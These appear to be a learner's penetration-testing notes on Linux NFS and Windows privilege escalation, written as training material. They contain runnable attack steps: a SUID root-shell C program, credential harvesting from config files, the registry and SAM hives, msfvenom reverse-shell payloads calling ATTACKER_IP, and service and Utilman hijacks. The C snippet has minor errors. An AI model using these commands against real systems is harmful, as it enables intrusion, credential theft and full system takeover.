				root

## Privilege Escalation: NFS

- Privilege escaltion vectors do not only lie on the internal access, but also shared folders and management interfaces such as SSh and Telnet can help us gain root access on the target system. But, here we will be talking about NFS (Network File Sharing) which is created during the NFS server installation and can be read by users. It is kept in /etc/exports.

  		$ cat /etc/exports

  - The eye catching and critcal element for this type of privilege escalation vector is the "no_root_squash" option. By default, NFS changes the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash" option is present on a writable share, then we can create an executable with SUID bit set and run it on the target system.
 
  - First, we can start by enumerating the mouontable shares from our attacking machine. It is better to use root in the attacking machine as we need to mount to the /tmp directory.

			# showmount -e TARGET_MACHINE_IP

  - If it shows the export list, as it should if the no_root_squash option is seen in the victim machine, we could mount the "no_root_squash" to our attacking machine and create an executable. First, we need to create a folder on the /tmp directory where we will mount the folder from target machine.
 
    		# mkdir /tmp/nischal

			$ mount -o rw TARGET_MACHINE_IP:/FOLDER_WITH/NO_ROOT_SQUASH /tmp/nischal

  - As we can set SUID bits, we will use a simple executable that will run /bin/bash on the victim system. For this we need to be on the directory where we have mounted the vulnerable folder of the target machine

			# nano nischal.c

			#include <stdio>

			#include <stdlib.h>		// for system()

			#include <unistd.h>		//for setuid(), setgid()

			int main() {

			setgid(0);

			setuid(0);

			system("/bin/bash");

			return 0;
	

			-> save and exit

	- Assuming, that target machine doesnot has the latest version of the GLIBC, and does not has compiler so it could compile it itslef, we can use a very large binary so that the execution doesnot fail on the target later on.

			# gcc nischal.c -o nischal -static

			# chmod +s nischal (setting SUID)

			# ls -l nischal

	- So, when we will go back to our target machine, both files (nischal.c and nischal will be already present under the folder which we mounted to the attacking machine. So, basically this is one of the application of a mounted share. Now we just need to run the executable.
 
    		$ ./nischal

			$ id

			uid=0(root) gid=0(root)

	- It is important to notice that the executable file had SUID bit set, that is why the system runs with root privileges.
 
 ## Other Tools:

 - LinPEAS

   		$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
   
		$ chmod +x linpeas_linux_amd64

		$ ./linpeas_linux_amd64
 
# Privilege Escalation: Windows

- Depending on the situation, we can abusy some of the weaknesses in the Windows to gain higher privilege of the system:

	- Misconfiguration on Windows Services or scheduled tasks

	- Excessive Privilege to our account

   	- Vulnerable software
 
   	- Missing Windows Security patches
 
- Windows system have mainly two types of user ( Administrators and Standard User). In addition to that there also usually exists an built-in accounts used by the operating system:

  	- SYSTEM/LocalSystem : used by OS to perform internal tasks. has full access to all files available on the host with even higher privileges than the administrators.
 
  	- Local Service: default account to run Windows services with "minimum" privilieges. uses anonymous connection over the internet.
 
  	- Network Service: uses the computer credentials to authenticate through the network.
 
  	  (These accounts are created and managed by Windows, but we may gain their privileges by exploiting specific services.
 
 
 ## Harvesting Passwords from usual spot:

 - One of the easiest way to gain access to another user is to gather credentials from a comprmised machine. This usually exists because of the carelessness of the user by leaving them in plaintext files or even stored by some software like browsers and email.

  ### Unattended Windows Installations:

   - When installing Windows on a large number of hosts, admins may use Windows Deployment Services. What it does is it allows a single OS image to be deployed to several hosts through the network. These types of installations are called unattended installations as they do not require user interaction. So, they are typically stored in:

	 	- C:\Unattend.xml
   	  
   	  	- C:\Windows\Panther\Unattend.xml
    
      	- C:\Windows\system32\sysprep.inf
    
      	- C:\Windows\system32\sysprep\sysprep.xml
    
      	  	-> As part of these files, we mount find some credentials.

### Powershell History:

  - We could also check powershell history to see if a user have previosuly executed a command using Powershell to see past commands. If a user have previously run a command that includes a password, then we can retrieve it using the cmd.exe prompt:
 
    	> type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

	- We could only run this command in cmd.exe as Powershell do not recognize the "%userprofile%" as an environment variable. So, in Powershell we could write "$Env:userprofile".

- Saved Windows Credentials:

  - Windows also allows us to use other users credentials.
 
    		> cmdkey /list

	- It does not show the actual password, but if a user is within this suppose 'nischal', we can easily extract the password using:

			> runas /savecred /user:nischal cmd.exe

 ### IIS Configuration:

   - IIS stands for Internet Information Services which is the default web server on Windows installations. The configuration of websites on IIS is stored in "web.config" and it could store passwords for databases or other authentication mechanisms. Depending on the IIS version, we can locate this file in:
  
     	- C:\inetpub\wwwroot\webconfig
    
     	- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    
     - to find the database connection string we could run:
    
       		> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

 ### Retreive Credentials from Software:PuTTY

 - PuTTY is an SSH client which is commonly found on Windows systems. The role of this software is to store sessions such as Ip, user and other configurations rather than specifying connection's parameter each time. It stores proxy configurations that include cleaertext authentication credentials. SSH password is however not allowed to be stpred in PuTTY.

 - To retireve the stored proxy credentials, we can search under the registry key for ProxyPassword:

   		> reg query HKEY_CURRENT_USER\Software|SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

    - Here, Simon Tatham is the creator of PuTTY and that is the name of the path not the username for which we would be retrieving password for.

## Other Qucik Wins:

- Some misconfiguration can give us advantage to obtain higher privilege user access and in some cases even administrator access.

  ### Scheduled Tasks:

  - Accoring to my view, a scheduled task is quite similar to the cronjobs in linux OS, as we could see if the scheduled task has either lost its binary or the binary could be modified.
 
  - It can be listed using:

			> schtasks /query /tn vulntask /fo list /v

	 - Looking at the information we will get here, we could easily identify the scheduled task by looking at the "Task to Run" parameter. Also, "Run As User" parameter could help us identify the user that will be used to execute the task. So, if our current user can modify this "Task to Run" executable, then we can control the script that will be executed by this user which results in a simple privilege escalation.

	 - To check the file permission on the executable, we can use:

			> icacls c:\tasks\schtask.bat

	 - If the BUILTIN\Users group has full access (F) over this tasks binary, then we can modify the .bat file and insert any payload we want. After creating a payload we coud just use this command:

			> echo c:\path\to\payload.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

	 - We listen on our attacking machine

			> nc-lvnp 4444

	 - So the next time the scheduled task runs, we will recieve the reverse shell with the user privilege that was supposed to run this task.

### AlwaysInstallElevated:

- Windows installer files (.msi files) are used to install applications on the system. They run with the privilege level of the user that starts it. However, these files could be run with higher privileges from even lower privileged ones. We can generate a mallicious MSI files that would run with admin priviliges.

- So the method requires us to set two registry values. It can be queried from the command line:

  		> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

  		> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

  - Both should be set to exploit this vulnerability. Then, we can generate a malicious .msi file using msfvenom:
 
    		> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

	 - We shoudl also run the Metasploit handler module by configuring it correctly and transfer this file to the Windows by hosting a python server then downloading it on windows system.

	 - to exploit it, we would run:

			> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

## Abusing Service Misconfigurations

### Windows Services:

- Service Control Manager(SCM) manages Windows services. Each service on a Windows machine will have an associayed executable that will be run by the SCM whenever a service is started.

- Structure of a service:

  		> sc qc apphostsvc

  (checking the strucure of this service)

  		SERVICE NAME : apphostsvc

			TYPE:

  			START_TYPE:

			ERROR_CONTROL:

  			BINARY_PATH_NAME:

  			LOAD_ORDER_GROUP:

  			TAG:

  			DISPLAY NAME:

  			DEPENDENCIES:

  			SERVICE_START_NAME:

  {It is important to note to always check for binary path name and service start name to find any exploits realted to the service}

  - Services have Discretionary Access Control list (DACL) that indicates who has permission to start, stop, pause, query status. query configuration, or reconfigure the service among other privileges. If a DACL is configured for the service, it will be stored in a subkey called Security and only administrators can modify such registry entries by default.
 
  ### Insecure Permissions on Service Executable:

  - If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, then the attacker can gain the privileges of the service's account.
 
    		> sc qc SERVICENAME

	 - As I have mentioned above the key parameters to check for is the binary path name and service start name. If the service runs as a normal user other than the one we are logged in as, then it can be interesting to check the binary path permissions.

			> icacls BINARY_PATH_NAME

	 - If we can spot anything like "Everyone:(I)(M), then it can be confirmed that the service is modifiable, and our current user can manipulate it. So, we can easily overwrite it with any payload of our preference, and the service will execute it with the privilege of the configured user account.

	 - First, we need to generate a paylaod:

			$ msfvenom -p windows/x64/shell_reverse_shell_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o svc.exe

	 - Then serve a server so that the windows unprivileged user can pull this file.

			$ python3 -m http.server

	 - Pull the payload from the command line.

			> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe

	 - Once the payload is in the Windows server, we need to replace the existing vulnerable service executable with this payload.

			> cd PATH\TO\VULNERABLE_SERVICE

			> move VulnerableService.exe VulnerableService.exe.bkp

	 - Then, we move our payload to this binary path where the service is executed

			> move PATH\OF\LOWERPRIVUSER\svc.exe VulnerableService.exe

	 - As, we need to execute our payload from another user, we will give full permission to the Everyone group as well.

			>icacls VulnerableService.exe /grant Everyone:F

	 - Then, we have to wait for the service to be restarted adn have a listener ready on the attack machine.

			$ nc -lvnp 4444

	 - After this vulnerable service gets restarted, we will get a shell of the privileged configured user account on the attack machine.

### Unquoted Service Paths:

- In case we cannot directly write into service executables like shown above, there still might be a chance to force a service into running arbitrary executables.

- When working with Windows services, a specific behaviour occurs when the service is configured to point to an "unquoted executable". This means the path of the associated executable is not properly quoted to account for spaces on the command.

- We could search if this vulnerability exist by:

  		> sc qc "SERVICENAME"

- We already know the structure these queires throw out so, here we added the "" quote to the service name , so the paramter "BINARY_PATH_NAME" should show "PATH\TO\THE\SERVICE.exe". If the binary path does not has the "" quote, then, this means we can exploit this unquoted service path.
 
- This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument seperators unless they are part of the quoted string. So, suppose if a service has binary path C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe without the quote, then, the SCM tries:
 
    - First searches C:\\MyPrograms\\Disk.exe, if it runs the service will run this executable

	- If it does not exist, it will search C:\\MyPrograms\\DiskSorter.exe.

	- If that also does not exist, then it will search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe.

- So, the problem with this is if an attacker creates any of the executables that are searched for before the expected service executable, then they can force the service to run an arbitrary executable.
 
- Most of service executables is installed under C:\Program Files or C:\Program Files (x86) by default, that cannot be writable by unprivileged users. But, some installers change the permissions on the installed folder making these services vulnerable. Even some adminsitrators might decide to install the service binaries in a non-default path. So, if such path is world-writable, the vulnerability can be exploited.
 
- Assuming the example provided above of the binary path, We can check this using :
 
    	> icacls c:\MyPrograms

	- We could look for BUILTIN\USERS group, where the permissions are written for all users of the Windows system. If we can see (AD) and (WD) privileges, this means the user can create subdirectories and files in this location. So, an attacker can create an exe-service payload in this path so that the SCM tries the attackers payload executable before teaching the real service executable. The above method could be used to generate and serve the payload in the windows server.

			$ msfvenom -l <Payload> <Options>

			$ python -m http.server

		On windows:

			> curl http://ATTACKER_IP:8000/svc.exe -o svc.exe

	- Then, we can move this executable to the path of the binary which the SCM will reach first than the actual one.

			> move C:\Users\target\svc.exe C:\MyPrograms\Disk.exe

	- Grant Everyone full permission so it can be executed by service

			> icacls C:\MyPrograms\Disk.exe /grant Everyone:F

	 - Then, we can restart the service or wait for it to be restarted.
 
  		In Attacking Machine:
 
    		$ nc -lvnp 4444 (should be the port that is configured in the payload)
 
    	In Windows:

			> sc stop "disk sorter enterprise"

			> sc start "disk sorter enterprise"

	- As a result, we will get a reverse shell on the attacking machine of the privileged configured user that could give attacker more freedom inside the system
 
 ### Insecure Service Permissions:

 - We still have a slight chance of taking advantage of a service if the service's executable DACL is well configured and the service binary path is rightly quoted. We can check if the service DACL can allow us to modify the configuration of a service (not the service's executable DACL), then we could reconfigure the service. What this does is, it allows us to point to any executable we needs and run it with any account, including SYSTEM itself.
   
 - To check for a service DACL, we could use Accesschk from the Sysinternals suite.

   		> accesschk.exe -qlc SERVICE_NAME

   - If we can find any service that gives the BUILTIN\USERS access of SERVICE_ALL_ACCESS, this means any user can reconfigure the service.
  
   - Assuming we found a service with this permission for the built in user, we could build exe-service reverse shell payload using msfvenom.
  
     		$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATACKER_IP LPORT=4444 -f exe-service -o svc.exe

	 - Now, the same method we used before, we will transfer this executable to the windows machine which we would have gained access to (low level user). Then, the same way we could grant permission for this executable to Everyone so the payload can be executed from anywhere.
  
   - Now, the main part is, to chance the service's associated executable and account, we can use:
  
     		> sc config SERVICE_NAME binPath="C:\PATH\TO\PAYLOAD\svc.exe" obj= LocalSystem

	- As we could use any account to run the service, here we chose LocalSystem because it is the highest privilege account available. Now to trigger our payload we need to restart the service, but before we should have a listener ready to gain a reverse shell on the attacking machine.

	 	On Attacking Machine

			$ nc -lvnp 4444

		On Windows Machine

			> sc stop SERICE_NAME

	 		> sc start SERVICE_NAME

	 - When we will look at our machine we will be at the highest privilege account of the Windows machine.

## Abusing Dangerous Privileges:

- Privileges are rights that an acoount can perform based on specific system-related tasks. We could even bypass some DACL-based access control because of some privileges given to low level user.

  ### SeBackup/ SeRestore:

  - The SeBackup and SeRestore privileges allow user to read and write to any file in the system by ignoring DACL in place. This privilege is given to some users to perform backups from a system without requiring full administrative privilege. Compromising such accounts could give an attacker power to escalate privileges on the system by using many techniques. One of which is copying the SAM and SYSTEM registry hives to extract the local Administrators password hash.
 
  - We could check the privilege of the user by:
 
    	> whoami /priv

	- If we can see SeBackup and SeRestore privilege, then we can exploit this privilege to gain administrators password hash. The first step would be to backup the SAM and SYSTEM hashes.
 
    		> reg save hklm\system C:\Users\Nischal\system.hive

			> reg save hklm\sam C:\Users\Nischal\sam.hive

	- This will create couple of files with the registry hives content. We can then copy these files to our attacking machine using SMB or other methods. For SMB, we could use impacket smbserver.py to host a simple SMB server with a network share of our attacking machine.
 
    		$ mkdir share

			$ python3 /path/to/the/smbserver.py -smb2support -username Nischal -password hello! public share

	- This will create a share named public which points to the share diretory we created. Username and password are the credentials of the compromised windows target. Then, we can copy the registry hives content to transfer it to the attacking machine.
 
    		> copy C:\Users\Nischal\sam.hive \\ATTACKER_IP\public\

			> copy C:\Users\Nischal\system.hive \\ATTACKER_IP\public\

	- Now, we can use impacket to retrieve the users password hashes.
 
    		$ python3 /path/to/the/secretsdump.py -sam sam.hive -system system.hive LOCAL

	- After getting the hash value of Administrator, we can perform Pass-the-Hash attack to gain access to the target machine with SYSTEM privileges. First copy the admins password hash value.
 
    		$ python3 /path/to/the/psexex.py -hashes ADMIN_HASH administrator@TARGET_IP

	- After this we will get a Windows cmd in our attacking machine and we will be at the highest level of privilege.
 
 ### SeTakeOwnership:

 - This Privilege allows a user to take ownership fo any object on the system which includes files and registry keys. This opens many possibilities for an attacker to elevate privileges. An example would be searching for a service running as SYSTEM and taking its ownership.

 - The first step will be to run command promt as administrator and use the pasword of the current user to get the command line.

   		> whoami /priv

   - If we have a privilege named SETakeOwnershipPrivilege, then we can abuse utilman.exe to esacalte privileges. Utilman is a built-in Windows application used to provide ease of access options during the lock screen and it runs with SYSTEM privileges.
  
   - So, to replace utilman, we will first take ownership of it.
  
     		> takeown /f C:\Windows\System32\Utilman.exe

	- It is important to note that being the file owner does not mean we have privileges over it, so we need to assign ourself the privilege we need.

   			> icacls C:\Windows\System32\Utilman.exe /grant Nischal:F

   	- After this we need to replace utilman.exe with a copy of cmd.exe.
  
   	  		> copy cmd.exe utilman.exe

	- Finally, to trigger utilman, we will need to lock our screen and click on "Ease of Access" button to run utilman.exe. Since, we replaced it with a copy of cmd.exe, we will get a command prompt with SYSTEM privileges.

 - These are some of the privileges we can exploit but depending on the system, many more could be fould such as SEImpersonate/SeAssignPrimaryToken.

## Abusing Vulnerable Software:

- Software installed on the target machine could also potentially lead to many privilege escalation opportunites. Like operating system, users and organisations may not update drivers or software which attackers could exploit. To gather information on the installed software we can type the following command.

  		> wmic product get name,version,vendor

  - This command does not guarantee to return all installed program, so it is of best practice to check desktop shortcuts, available services or any trace that indicates the existence of additional software that is vulnerable.
 
  - Once enumeration on the software has been done, we could check exploit-db or google to search for known exploits.
 
  ## Tools:

  - Several scripts are availabe to conduct system enumeration on Windows machine which could shorten the process time of enumeration itself and uncover different potential privilege escalation vectors. However, these automated enumeration could sometimes miss privilage escaltion vulnerabilites.
 
  - Some of the common tools to identify privilege escalation vectors are:
 
    - WinPEAS

			> winpeas.exe > output.txt

	- PrivescCheck
 
    		> Set-ExecutionPolicy Bypass -Scope process -Force

			> . .\PrivescCheck.ps1

			> Invoke-PrivescCheck

	 - WES-NG
 
     		> wes.py systeminfo.txt (.txt file download from Windows)

	 - Metasploit
 
     	- If we already have a Meterpreter shell on the target system, we can use "multi/recon/local_exploit_suggester" module to list vulnerabilites on the target system which will help us to elevate privileges.
		
    
    

# REFERENCES

OFFSEC’s Exploit Database archive. https://www.exploit-db.com/

OFFSEC’s Exploit Database archive. https://www.exploit-db.com/google-hacking-database

Swisskyrepo. PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings. GitHub. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Danielmiessler. GitHub - danielmiessler/SecLists  https://github.com/danielmiessler/SecLists

TryHackMe | Cyber Security Training. (2026). TryHackMe. https://tryhackme.com/paths/JrPenetrationTester

GTFOBins. https://gtfobins.github.io/

Rebootuser. GitHub - rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks. GitHub. https://github.com/rebootuser/LinEnum

Gtworek. GitHub - gtworek/Priv2Admin: Exploitation paths allowing you to (mis)use the Windows Privileges to elevate your rights within the OS. GitHub. https://github.com/gtworek/Priv2Admin
 
     








	
	

	
	
	
	
	









